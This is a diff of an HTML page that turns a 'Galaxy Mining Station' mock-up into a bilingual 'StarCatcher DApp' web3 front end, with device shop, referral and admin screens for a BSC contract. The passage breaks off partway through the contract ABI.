@@ -1,809 +1,381 @@
 <!DOCTYPE html>
-
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Galaxy Mining Station</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    <title>StarCatcher DApp</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-```
-    body {
-        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        background: linear-gradient(135deg, #0f0f23 0%, #1a1a3e 50%, #2d1b69 100%);
-        min-height: 100vh;
-        color: white;
-        overflow-x: hidden;
-        position: relative;
-    }
-
-    body::before {
-        content: '';
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: 
-            radial-gradient(circle at 20% 30%, rgba(255, 20, 147, 0.1) 0%, transparent 50%),
-            radial-gradient(circle at 80% 70%, rgba(0, 191, 255, 0.1) 0%, transparent 50%),
-            radial-gradient(circle at 50% 50%, rgba(138, 43, 226, 0.05) 0%, transparent 70%);
-        pointer-events: none;
-        z-index: -1;
-    }
-
-    .container {
-        max-width: 428px;
-        margin: 0 auto;
-        min-height: 100vh;
-        position: relative;
-        padding: 0 16px;
-    }
-
-    /* Wallet Connection Page */
-    .wallet-connect-page {
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        text-align: center;
-        padding: 20px;
-    }
-
-    .brand-logo {
-        font-size: 2.5rem;
-        font-weight: bold;
-        background: linear-gradient(45deg, #ff1493, #00bfff, #8b2ad6);
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-        background-clip: text;
-        margin-bottom: 1rem;
-        animation: glow 2s ease-in-out infinite alternate;
-    }
-
-    @keyframes glow {
-        from { filter: drop-shadow(0 0 10px rgba(255, 20, 147, 0.5)); }
-        to { filter: drop-shadow(0 0 20px rgba(0, 191, 255, 0.5)); }
-    }
-
-    .slogan {
-        font-size: 1.2rem;
-        margin-bottom: 3rem;
-        opacity: 0.9;
-        font-weight: 300;
-    }
-
-    .connect-btn {
-        background: linear-gradient(45deg, #ff1493, #8b2ad6, #00bfff);
-        border: none;
-        padding: 18px 40px;
-        border-radius: 50px;
-        color: white;
-        font-size: 1.1rem;
-        font-weight: 600;
-        cursor: pointer;
-        transition: all 0.3s ease;
-        box-shadow: 0 10px 30px rgba(255, 20, 147, 0.3);
-        position: relative;
-        overflow: hidden;
-    }
-
-    .connect-btn::before {
-        content: '';
-        position: absolute;
-        top: 0;
-        left: -100%;
-        width: 100%;
-        height: 100%;
-        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-        transition: left 0.5s;
-    }
-
-    .connect-btn:hover::before {
-        left: 100%;
-    }
-
-    .connect-btn:hover {
-        transform: translateY(-2px);
-        box-shadow: 0 15px 40px rgba(255, 20, 147, 0.4);
-    }
-
-    .connect-btn:active {
-        transform: scale(0.95);
-    }
-
-    .wallet-info {
-        margin-top: 2rem;
-        opacity: 0.7;
-        font-size: 0.9rem;
-    }
-
-    /* Main Dashboard */
-    .main-app {
-        display: none;
-    }
-
-    .main-app.active {
-        display: block;
-    }
-
-    .header {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        padding: 20px 0;
-        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        margin-bottom: 20px;
-    }
-
-    .logo-small {
-        font-size: 1.2rem;
-        font-weight: bold;
-        background: linear-gradient(45deg, #ff1493, #00bfff);
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-    }
-
-    .wallet-address {
-        background: rgba(255, 255, 255, 0.1);
-        padding: 8px 16px;
-        border-radius: 20px;
-        font-size: 0.9rem;
-        cursor: pointer;
-        transition: all 0.3s ease;
-        border: 1px solid rgba(255, 255, 255, 0.2);
-    }
-
-    .wallet-address:hover {
-        background: rgba(255, 255, 255, 0.2);
-    }
-
-    /* Language Toggle */
-    .language-toggle {
-        position: absolute;
-        top: 20px;
-        right: 20px;
-        background: rgba(255, 255, 255, 0.1);
-        border: 1px solid rgba(255, 255, 255, 0.2);
-        border-radius: 20px;
-        padding: 8px 12px;
-        cursor: pointer;
-        font-size: 0.8rem;
-        transition: all 0.3s ease;
-    }
-
-    .language-toggle:hover {
-        background: rgba(255, 255, 255, 0.2);
-    }
-
-    /* Navigation Tabs */
-    .nav-tabs {
-        display: flex;
-        justify-content: space-around;
-        background: rgba(255, 255, 255, 0.05);
-        border-radius: 25px;
-        padding: 5px;
-        margin-bottom: 20px;
-        backdrop-filter: blur(10px);
-    }
-
-    .nav-tab {
-        flex: 1;
-        padding: 12px;
-        text-align: center;
-        border-radius: 20px;
-        cursor: pointer;
-        transition: all 0.3s ease;
-        font-size: 0.9rem;
-        font-weight: 500;
-    }
-
-    .nav-tab.active {
-        background: linear-gradient(45deg, #ff1493, #8b2ad6);
-        box-shadow: 0 5px 15px rgba(255, 20, 147, 0.3);
-    }
-
-    /* Card Styles */
-    .card {
-        background: rgba(255, 255, 255, 0.08);
-        border-radius: 20px;
-        padding: 20px;
-        margin-bottom: 20px;
-        backdrop-filter: blur(15px);
-        border: 1px solid rgba(255, 255, 255, 0.1);
-        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
-    }
-
-    .asset-overview {
-        text-align: center;
-    }
-
-    .balance-amount {
-        font-size: 2rem;
-        font-weight: bold;
-        background: linear-gradient(45deg, #00bfff, #ff1493);
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-        margin: 10px 0;
-    }
-
-    .claim-btn {
-        background: linear-gradient(45deg, #ff1493, #ff6b35);
-        border: none;
-        padding: 12px 30px;
-        border-radius: 25px;
-        color: white;
-        font-weight: 600;
-        cursor: pointer;
-        transition: all 0.3s ease;
-        position: relative;
-        overflow: hidden;
-    }
-
-    .claim-btn:hover {
-        transform: translateY(-2px);
-        box-shadow: 0 10px 25px rgba(255, 20, 147, 0.4);
-    }
-
-    .claim-btn.has-rewards::after {
-        content: '';
-        position: absolute;
-        top: -2px;
-        right: -2px;
-        width: 10px;
-        height: 10px;
-        background: #ff6b35;
-        border-radius: 50%;
-        animation: pulse 1.5s infinite;
-    }
-
-    @keyframes pulse {
-        0% { transform: scale(1); opacity: 1; }
-        50% { transform: scale(1.2); opacity: 0.7; }
-        100% { transform: scale(1); opacity: 1; }
-    }
-
-    /* Device Grid */
-    .device-grid {
-        display: grid;
-        grid-template-columns: 1fr 1fr;
-        gap: 15px;
-        margin-bottom: 20px;
-    }
-
-    .device-card {
-        background: rgba(255, 255, 255, 0.08);
-        border-radius: 15px;
-        padding: 15px;
-        text-align: center;
-        border: 1px solid rgba(255, 255, 255, 0.1);
-        transition: all 0.3s ease;
-    }
-
-    .device-card:hover {
-        transform: translateY(-5px);
-        box-shadow: 0 10px 30px rgba(255, 20, 147, 0.2);
-    }
-
-    .device-icon {
-        font-size: 2rem;
-        margin-bottom: 10px;
-        display: block;
-    }
-
-    .device-name {
-        font-size: 0.9rem;
-        font-weight: 600;
-        margin-bottom: 5px;
-        background: linear-gradient(45deg, #00bfff, #ff1493);
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-    }
-
-    .device-count {
-        font-size: 1.2rem;
-        font-weight: bold;
-        color: #00bfff;
-    }
-
-    /* Shop Styles */
-    .shop-tabs {
-        display: flex;
-        overflow-x: auto;
-        margin-bottom: 20px;
-        padding: 0 5px;
-    }
-
-    .shop-tab {
-        min-width: 120px;
-        padding: 10px 15px;
-        text-align: center;
-        background: rgba(255, 255, 255, 0.08);
-        border-radius: 20px;
-        margin-right: 10px;
-        cursor: pointer;
-        transition: all 0.3s ease;
-        white-space: nowrap;
-    }
-
-    .shop-tab.active {
-        background: linear-gradient(45deg, #8b2ad6, #00bfff);
-    }
-
-    .device-shop-card {
-        background: rgba(255, 255, 255, 0.08);
-        border-radius: 20px;
-        padding: 20px;
-        margin-bottom: 15px;
-        border: 1px solid rgba(255, 255, 255, 0.1);
-    }
-
-    .device-3d-icon {
-        width: 60px;
-        height: 60px;
-        background: linear-gradient(45deg, #ff1493, #00bfff);
-        border-radius: 15px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 1.5rem;
-        margin: 0 auto 15px;
-        animation: rotate3d 3s linear infinite;
-    }
-
-    @keyframes rotate3d {
-        0% { transform: rotateY(0deg); }
-        100% { transform: rotateY(360deg); }
-    }
-
-    .price-tag {
-        background: linear-gradient(45deg, #ff6b35, #ff1493);
-        color: white;
-        padding: 8px 15px;
-        border-radius: 20px;
-        font-weight: 600;
-        display: inline-block;
-        margin: 10px 0;
-    }
-
-    .buy-controls {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        margin-top: 15px;
-    }
-
-    .quantity-input {
-        background: rgba(255, 255, 255, 0.1);
-        border: 1px solid rgba(255, 255, 255, 0.2);
-        border-radius: 10px;
-        padding: 10px;
-        color: white;
-        width: 80px;
-        text-align: center;
-    }
-
-    .buy-btn {
-        background: linear-gradient(45deg, #00bfff, #8b2ad6);
-        border: none;
-        padding: 10px 20px;
-        border-radius: 20px;
-        color: white;
-        font-weight: 600;
-        cursor: pointer;
-        transition: all 0.3s ease;
-    }
-
-    .buy-btn:hover {
-        transform: scale(1.05);
-        box-shadow: 0 5px 15px rgba(0, 191, 255, 0.4);
-    }
-
-    /* Progress Bar */
-    .progress-bar {
-        width: 100%;
-        height: 8px;
-        background: rgba(255, 255, 255, 0.1);
-        border-radius: 4px;
-        overflow: hidden;
-        margin: 10px 0;
-    }
-
-    .progress-fill {
-        height: 100%;
-        background: linear-gradient(45deg, #00bfff, #ff1493);
-        border-radius: 4px;
-        transition: width 1s ease;
-    }
-
-    /* Stats Cards */
-    .stats-grid {
-        display: grid;
-        grid-template-columns: 1fr 1fr;
-        gap: 15px;
-    }
-
-    .stat-card {
-        background: rgba(255, 255, 255, 0.08);
-        border-radius: 15px;
-        padding: 15px;
-        text-align: center;
-        border: 1px solid rgba(255, 255, 255, 0.1);
-    }
-
-    .stat-value {
-        font-size: 1.5rem;
-        font-weight: bold;
-        color: #00bfff;
-        margin-bottom: 5px;
-    }
-
-    .stat-label {
-        font-size: 0.8rem;
-        opacity: 0.8;
-    }
-
-    /* Bottom Navigation */
-    .bottom-nav {
-        position: fixed;
-        bottom: 0;
-        left: 50%;
-        transform: translateX(-50%);
-        width: 100%;
-        max-width: 428px;
-        background: rgba(15, 15, 35, 0.95);
-        backdrop-filter: blur(20px);
-        border-top: 1px solid rgba(255, 255, 255, 0.1);
-        padding: 15px;
-    }
-
-    .nav-actions {
-        display: flex;
-        justify-content: space-around;
-    }
-
-    .nav-action {
-        background: rgba(255, 255, 255, 0.1);
-        border: none;
-        padding: 12px 20px;
-        border-radius: 20px;
-        color: white;
-        font-size: 0.8rem;
-        cursor: pointer;
-        transition: all 0.3s ease;
-    }
-
-    .nav-action:hover {
-        background: rgba(255, 255, 255, 0.2);
-        transform: translateY(-2px);
-    }
-
-    /* Hidden pages */
-    .page {
-        display: none;
-    }
-
-    .page.active {
-        display: block;
-        animation: fadeIn 0.3s ease;
-    }
-
-    @keyframes fadeIn {
-        from { opacity: 0; transform: translateY(20px); }
-        to { opacity: 1; transform: translateY(0); }
-    }
-
-    /* Responsive Design */
-    @media (max-width: 375px) {
-        .container { padding: 0 12px; }
-        .brand-logo { font-size: 2rem; }
-        .device-grid { grid-template-columns: 1fr; }
-        .stats-grid { grid-template-columns: 1fr; }
-    }
-
-    /* Loading Spinner */
-    .loading {
-        display: inline-block;
-        width: 20px;
-        height: 20px;
-        border: 3px solid rgba(255, 255, 255, 0.3);
-        border-radius: 50%;
-        border-top-color: #fff;
-        animation: spin 1s ease-in-out infinite;
-    }
-
-    @keyframes spin {
-        to { transform: rotate(360deg); }
-    }
-
-    /* Toast Notifications */
-    .toast {
-        position: fixed;
-        top: 20px;
-        left: 50%;
-        transform: translateX(-50%);
-        background: rgba(0, 0, 0, 0.9);
-        color: white;
-        padding: 15px 25px;
-        border-radius: 25px;
-        backdrop-filter: blur(10px);
-        z-index: 1000;
-        opacity: 0;
-        transition: opacity 0.3s ease;
-    }
-
-    .toast.success {
-        background: linear-gradient(45deg, #4CAF50, #8BC34A);
-    }
-
-    .toast.error {
-        background: linear-gradient(45deg, #F44336, #E91E63);
-    }
-
-    .toast.show {
-        opacity: 1;
-    }
-
-    /* Referral Section */
-    .referral-code {
-        background: rgba(255, 255, 255, 0.08);
-        border: 1px solid rgba(255, 255, 255, 0.2);
-        border-radius: 10px;
-        padding: 12px;
-        margin: 10px 0;
-        font-family: monospace;
-        color: #00bfff;
-        text-align: center;
-        cursor: pointer;
-        transition: all 0.3s ease;
-    }
-
-    .referral-code:hover {
-        background: rgba(255, 255, 255, 0.15);
-    }
-
-    .referral-input {
-        width: 100%;
-        background: rgba(255, 255, 255, 0.1);
-        border: 1px solid rgba(255, 255, 255, 0.2);
-        border-radius: 10px;
-        padding: 12px;
-        color: white;
-        margin-bottom: 10px;
-    }
-
-    .referral-input::placeholder {
-        color: rgba(255, 255, 255, 0.5);
-    }
-
-    /* Admin Badge */
-    .admin-badge {
-        background: linear-gradient(45deg, #FFD700, #FFA500);
-        color: #000;
-        padding: 4px 8px;
-        border-radius: 12px;
-        font-size: 0.7rem;
-        font-weight: bold;
-        margin-left: 8px;
-    }
-</style>
-```
-
+        :root{--deep:#0d0d2b;--purple:#6f42c1;--sky:#00d4ff;--pink:#ff2c93;--card:#1a1a40}
+        html,body{margin:0;height:100%;font-size:16px;font-family:-apple-system,BlinkMacSystemFont,"PingFang SC",Arial;color:#fff;background:linear-gradient(135deg,var(--deep),#1a1a40)}
+        .screen{display:none;flex:1;flex-direction:column;padding:16px}.screen.active{display:flex}
+        header{position:sticky;top:0;z-index:9;background:#00000033;backdrop-filter:blur(8px);padding:12px 16px;display:flex;justify-content:space-between;font-size:16px}
+        button{border:none;border-radius:12px;padding:14px 24px;background:linear-gradient(135deg,var(--purple),var(--sky));color:#fff;font-size:18px;font-weight:600;cursor:pointer;margin:8px 0}
+        .bottom-bar{position:fixed;bottom:0;left:0;right:0;display:flex;background:#1a1a40;border-top:1px solid #ffffff22}
+        .bottom-bar button{flex:1;border-radius:0;background:transparent;color:#fff;font-size:16px;padding:12px 0}
+        .card{background:#1a1a40;border-radius:12px;padding:16px;margin-bottom:16px}
+        #toast{position:fixed;top:20%;left:50%;transform:translate(-50%,-50%);padding:12px 20px;border-radius:12px;color:#fff;font-weight:600;z-index:999;opacity:0;transition:.3s}
+        #toast.success{background:#00c851} #toast.error{background:#ff2c93}
+        input{width:100%;padding:12px;border-radius:12px;border:1px solid #666;background:transparent;color:#fff;margin-bottom:12px}
+    </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Language Toggle -->
-        <div class="language-toggle" onclick="toggleLanguage()">
-            <span id="lang-text">EN</span>
-        </div>
 
-```
-    <!-- Wallet Connection Page -->
-    <div id="wallet-connect" class="wallet-connect-page">
-        <div class="brand-logo" id="brand-title">Galaxy Mining Station</div>
-        <div class="slogan" id="brand-slogan">Collect Stars, Earn Rewards</div>
-        <button class="connect-btn" onclick="connectWallet()" id="connect-btn-text">
-            Connect Wallet
-        </button>
-        <div class="wallet-info" id="wallet-support-text">
-            Supports MetaMask, Trust Wallet and other kernel browsers
-        </div>
+<!-- 连接页 -->
+<div id="screen-connect" class="screen active">
+    <div style="flex:1;display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center">
+        <h1 data-en="Collect Stars, Earn Rewards" data-zh="收集星光，收获奖励">收集星光，收获奖励</h1>
+        <p data-en="Connect TP Wallet" data-zh="连接 TP 钱包">连接 TP 钱包开始探索区块链宇宙</p>
+        <button onclick="connectWallet()"><span data-en="Connect TP Wallet" data-zh="连接 TP 钱包">连接 TP 钱包</span></button>
+        <small style="margin-top:12px;opacity:.7" data-en="Make sure BSC network" data-zh="请确保已切换至 BSC 网络">请确保已切换至 BSC 网络</small>
     </div>
+</div>
 
-    <!-- Main Application -->
-    <div id="main-app" class="main-app">
-        <!-- Header -->
-        <div class="header">
-            <div class="logo-small">Galaxy Station</div>
-            <div class="wallet-address" onclick="toggleFullAddress()" id="wallet-display">
-                0x71C...8f2A
-            </div>
-        </div>
+<!-- 仪表盘 -->
+<div id="screen-dashboard" class="screen">
+    <div class="card"><h3 data-en="Assets" data-zh="资产概览">资产概览</h3>
+        <p><span data-en="Reward Token" data-zh="奖励代币">奖励代币</span>：<span id="val-rewardToken">-</span></p>
+        <p><span data-en="Total Earned" data-zh="累计收益">累计收益</span>：<span id="val-earned">-</span></p>
+        <button onclick="claimRewards()"><span data-en="Claim" data-zh="领取收益">领取收益</span></button>
+    </div>
+    <div class="card"><h3 data-en="Devices" data-zh="我的设备">我的设备</h3>
+        <p><span data-en="Moon Converter" data-zh="月光转换器">月光转换器</span>：<span id="normalCount">-</span> 台</p>
+        <p><span data-en="Stardust L1" data-zh="星尘收集器L1">星尘收集器L1</span>：<span id="p0">-</span> 台</p>
+        <p><span data-en="Quantum L2" data-zh="量子蒲公英L2">量子蒲公英L2</span>：<span id="p1">-</span> 台</p>
+        <p><span data-en="Aurora L3" data-zh="极光编织机L3">极光编织机L3</span>：<span id="p2">-</span> 台</p>
+        <p><span data-en="Galaxy L4" data-zh="银河过滤器L4">银河过滤器L4</span>：<span id="p3">-</span> 台</p>
+        <p><span data-en="Total Power" data-zh="总算力">总算力</span>：<span id="val-totalPower">-</span></p>
+    </div>
+    <div class="card"><h3 data-en="Profit" data-zh="收益详情">收益详情</h3>
+        <p><span data-en="Daily Est." data-zh="今日预计">今日预计</span>：<span id="val-daily">-</span></p>
+        <p><span data-en="Unclaimed" data-zh="未领取">未领取</span>：<span id="val-unclaimed">-</span></p>
+    </div>
+</div>
 
-        <!-- Navigation Tabs -->
-        <div class="nav-tabs">
-            <div class="nav-tab active" onclick="showPage('dashboard')" id="nav-dashboard">Dashboard</div>
-            <div class="nav-tab" onclick="showPage('shop')" id="nav-shop">Shop</div>
-            <div class="nav-tab" onclick="showPage('rewards')" id="nav-rewards">Rewards</div>
-            <div class="nav-tab" onclick="showPage('stats')" id="nav-stats">Stats</div>
-        </div>
+<!-- 商店 -->
+<div id="screen-shop" class="screen">
+    <div class="card"><h3 data-en="Initial Device" data-zh="初始设备">初始设备</h3><button onclick="buyInitial()"><span data-en="Buy Moon Converter 1 (0.01 BNB)" data-zh="购买月光转换器 1 台（0.01 BNB）">购买月光转换器 1 台（0.01 BNB）</span></button></div>
+    <div class="card"><h3 data-en="Advanced Device" data-zh="进阶设备">进阶设备</h3>
+        <button onclick="buyPower(0)"><span data-en="Stardust L1 1 (100 token)" data-zh="星尘收集器L1 1 台（100 代币）">星尘收集器L1 1 台（100 代币）</span></button>
+        <button onclick="buyPower(1)"><span data-en="Quantum L2 1 (200 token)" data-zh="量子蒲公英L2 1 台（200 代币）">量子蒲公英L2 1 台（200 代币）</span></button>
+        <button onclick="buyPower(2)"><span data-en="Aurora L3 1 (300 token)" data-zh="极光编织机L3 1 台（300 代币）">极光编织机L3 1 台（300 代币）</span></button>
+        <button onclick="buyPower(3)"><span data-en="Galaxy L4 1 (500 token)" data-zh="银河过滤器L4 1 台（500 代币）">银河过滤器L4 1 台（500 代币）</span></button>
+    </div>
+    <div class="card"><h3 data-en="Test Device" data-zh="测试设备">测试设备</h3><button id="btn-test" onclick="buyTest()"><span data-en="Buy Phantom Debugger 1 (0.0001 BNB)" data-zh="幻影调试器 1 台（0.0001 BNB）">幻影调试器 1 台（0.0001 BNB）</span></button></div>
+</div>
 
-        <!-- Dashboard Page -->
-        <div id="page-dashboard" class="page active">
-            <!-- Asset Overview -->
-            <div class="card asset-overview">
-                <h3 id="asset-title">Total Assets</h3>
-                <div class="balance-amount" id="balance-display">1,234.56 TOKENS</div>
-                <button class="claim-btn has-rewards" onclick="claimRewards()" id="claim-btn">
-                    <span id="claim-text">Claim Rewards</span>
-                </button>
-            </div>
+<!-- 推荐 -->
+<div id="screen-referral" class="screen">
+    <div class="card">
+        <h3 data-en="Referral" data-zh="推荐体系">推荐体系</h3>
+        <input id="referrerInput" placeholder="Referrer address / 推荐人地址">
+        <button onclick="setReferrer()"><span data-en="Set Referrer" data-zh="设置推荐人">设置推荐人</span></button>
+        <p><span data-en="Total Ref Reward" data-zh="累计推荐奖励">累计推荐奖励</span>：<span id="val-totalRef">-</span></p>
+        <ul id="ref-list" style="padding-left:16px"></ul>
+    </div>
+</div>
 
-            <!-- Device Status -->
-            <div class="card">
-                <h3 id="device-status-title">Device Status</h3>
-                <div class="device-grid">
-                    <div class="device-card">
-                        <span class="device-icon">🌙</span>
-                        <div class="device-name" id="device-moonlight">Moonlight Converter</div>
-                        <div class="device-count" id="moonlight-count">1</div>
-                    </div>
-                    <div class="device-card" id="phantom-card" style="display: none;">
-                        <span class="device-icon">👻</span>
-                        <div class="device-name" id="device-phantom">Phantom Debugger</div>
-                        <div class="device-count" id="phantom-count">0</div>
-                    </div>
-                    <div class="device-card">
-                        <span class="device-icon">⭐</span>
-                        <div class="device-name" id="device-stardust">Stardust Collector L1</div>
-                        <div class="device-count" id="stardust-count">3</div>
-                    </div>
-                    <div class="device-card">
-                        <span class="device-icon">🌸</span>
-                        <div class="device-name" id="device-quantum">Quantum Dandelion L2</div>
-                        <div class="device-count" id="quantum-count">2</div>
-                    </div>
-                    <div class="device-card">
-                        <span class="device-icon">🌌</span>
-                        <div class="device-name" id="device-aurora">Aurora Weaver L3</div>
-                        <div class="device-count" id="aurora-count">1</div>
-                    </div>
-                    <div class="device-card">
-                        <span class="device-icon">🌟</span>
-                        <div class="device-name" id="device-galaxy">Galaxy Filter L4</div>
-                        <div class="device-count" id="galaxy-count">0</div>
-                    </div>
-                </div>
+<!-- 全网数据 -->
+<div id="screen-global" class="screen">
+    <div class="card">
+        <h3 data-en="Global Stats" data-zh="全网数据">全网数据</h3>
+        <p><span data-en="Total Devices" data-zh="总设备数">总设备数</span>：<span id="val-globalMachines">-</span></p>
+        <p><span data-en="Network Power" data-zh="全网算力">全网算力</span>：<span id="val-globalPower">-</span></p>
+        <p><span data-en="Pool Balance" data-zh="奖励池余额">奖励池余额</span>：<span id="val-pool">-</span></p>
+        <p><span data-en="Daily Output" data-zh="今日全网产出">今日全网产出</span>：<span id="val-globalDaily">-</span></p>
+        <p><span data-en="Current Block" data-zh="当前区块">当前区块</span>：<span id="val-block">-</span></p>
+    </div>
+</div>
 
-                <!-- Total Power Progress -->
-                <div style="margin-top: 20px;">
-                    <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
-                        <span id="power-label">Total Power</span>
-                        <span id="power-percentage">12.34%</span>
-                    </div>
-                    <div class="progress-bar">
-                        <div class="progress-fill" style="width: 12.34%;"></div>
-                    </div>
-                </div>
-            </div>
+<!-- 管理员面板 -->
+<div id="screen-admin" class="screen">
+    <div class="card">
+        <h3 data-en="Admin Panel" data-zh="管理员面板">管理员面板</h3>
+        <input id="adminAddr" placeholder="Address / 地址">
+        <button onclick="addAdmin()"><span data-en="Add Admin" data-zh="添加管理员">添加管理员</span></button>
+        <button onclick="removeAdmin()"><span data-en="Remove Admin" data-zh="移除管理员">移除管理员</span></button>
+        <button onclick="addBlock()"><span data-en="Add to Blocklist" data-zh="加入黑名单">加入黑名单</span></button>
+        <button onclick="removeBlock()"><span data-en="Remove from Blocklist" data-zh="移除黑名单">移除黑名单</span></button>
+        <button onclick="pauseContract()"><span data-en="Pause Contract" data-zh="暂停合约">暂停合约</span></button>
+        <button onclick="unpauseContract()"><span data-en="Unpause Contract" data-zh="恢复合约">恢复合约</span></button>
+        <input id="withdrawAmount" placeholder="Amount / 提取代币数量">
+        <button onclick="withdrawTokens()"><span data-en="Withdraw Tokens" data-zh="提取代币">提取代币</span></button>
+        <button onclick="withdrawBNB()"><span data-en="Withdraw BNB" data-zh="提取BNB">提取BNB</span></button>
+    </div>
+</div>
 
-            <!-- Earnings Details -->
-            <div class="card">
-                <h3 id="earnings-title">Earnings Details</h3>
-                <div class="stats-grid">
-                    <div class="stat-card">
-                        <div class="stat-value" id="daily-reward">45.67</div>
-                        <div class="stat-label" id="daily-reward-label">Daily Reward</div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-value" id="unclaimed-reward">123.45</div>
-                        <div class="stat-label" id="unclaimed-label">Unclaimed</div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-value" id="referral-earnings">67.89</div>
-                        <div class="stat-label" id="referral-label">Referral Earnings</div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-value" id="total-power">8.45K</div>
-                        <div class="stat-label" id="total-power-label">Total Power</div>
-                    </div>
-                </div>
-            </div>
-        </div>
+<!-- 底部导航 -->
+<div class="bottom-bar">
+    <button onclick="toScreen('dashboard')" data-en="Dashboard" data-zh="仪表盘">仪表盘</button>
+    <button onclick="toScreen('shop')" data-en="Shop" data-zh="商店">商店</button>
+    <button onclick="toScreen('referral')" data-en="Referral" data-zh="推荐">推荐</button>
+    <button onclick="toScreen('global')" data-en="Global" data-zh="全网">全网</button>
+    <button onclick="toScreen('admin')" id="admin-tab-btn" style="display:none" data-en="Admin" data-zh="管理">管理</button>
+</div>
 
-        <!-- Shop Page -->
-        <div id="page-shop" class="page">
-            <!-- Shop Tabs -->
-            <div class="shop-tabs">
-                <div class="shop-tab active" onclick="showShopCategory('initial')" id="shop-initial">Initial Device</div>
-                <div class="shop-tab" onclick="showShopCategory('advanced')" id="shop-advanced">Advanced Device</div>
-                <div class="shop-tab" id="shop-test" onclick="showShopCategory('test')" style="display: none;">Test Device</div>
-            </div>
+<div id="toast"></div>
 
-            <!-- Initial Device Shop -->
-            <div id="shop-initial-content" class="shop-content">
-                <div class="device-shop-card">
-                    <div class="device-3d-icon">🌙</div>
-                    <h3 id="moonlight-title">Moonlight Converter</h3>
-                    <p id="moonlight-desc">Your first step into the galaxy mining world</p>
-                    <div class="price-tag">0.01 BNB</div>
-                    <div style="margin: 10px 0; color: #ff6b35; font-size: 0.9rem;" id="limit-text">
-                        Limit: 1 per person
-                    </div>
-                    <div class="buy-controls">
-                        <input type="number" class="quantity-input" value="1" min="1" max="1" id="moonlight-qty">
-                        <button class="buy-btn" onclick="buyInitialMachine()" id="buy-moonlight">
-                            Buy Now
-                        </button>
-                    </div>
-                </div>
-            </div>
+<script>
+    /* =====  合约地址  ===== */
+    const contractAddress="0x9dcced4ef738856d2c289d4116cd219c698b22ba";
+    const tokenAddress="0x877f23dcFBa91cadd7d35565Da452c9673C27A33";
+    let web3,accounts=[],contract,tokenContract;
 
-            <!-- Advanced Device Shop -->
-            <div id="shop-advanced-content" class="shop-content" style="display: none;">
-                <div class="device-shop-card">
-                    <div class="device-3d-icon">⭐</div>
-                    <h3 id="stardust-title">Stardust Collector L1</h3>
-                    <p id="stardust-desc">Enhanced collection efficiency with stellar technology</p>
-                    <div class="price-tag">100 TOKENS</div>
-                    <div class="buy-controls">
-                        <input type="number" class="quantity-input" value="1" min="1" max="100" id="stardust-qty">
-                        <button class="buy-btn" onclick="buyPowerMachine(0)" id="buy-stardust">
-                            Buy Now
-                        </button>
-                    </div>
-                </div>
+    /* =====  精简 ABI  ===== */
+    const contractABI=[{"inputs":[],"name":"INITIAL_MACHINE_PRICE_BNB","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"TEST_MACHINE_PRICE_BNB","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"a","type":"address"}],"name":"addAdmin","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"admin","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"buyInitialMachine","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tierId","type":"uint256"},{"internalType":"uint256","name":"count","type":"uint256"}],"name":"buyPowerMachine","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"buyTestMachine","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"claimRewards","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserDashboard","outputs":[{"internalType":"uint256","name":"normal","type":"uint256"},{"internalType":"uint256","name":"test","type":"uint256"},{"internalType":"uint256[4]","name":"power","type":"uint256[4]"},{"internalType":"uint256","name":"dailyReward","type":"uint256"},{"internalType":"uint256","name":"unclaimed","type":"uint256"},{"internalType":"uint256","name":"totalRefReward","type":"uint256"},{"internalType":"uint256","name":"totalPower","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getGlobalDashboard","outputs":[{"internalType":"uint256","name":"baseReward","type":"uint256"},{"internalType":"uint256","name":"totalMines","type":"uint256"},{"internalType":"uint256","name":"currentBlock","type":"uint256"},{"internalType":"uint256","name":"poolBalance","type":"uint256"},{"internalType":"uint256","name":"networkPower","type":"uint256"},{"internalType":"uint256","name":"dailyProduction","type":"uint256"},{"internalType":"uint256","name":"totalRefRewards","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"machineTiers","outputs":[{"internalType":"uint256","name":"priceToken","type":"uint256"},{"internalType":"uint256","name":"powerMultiplier","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[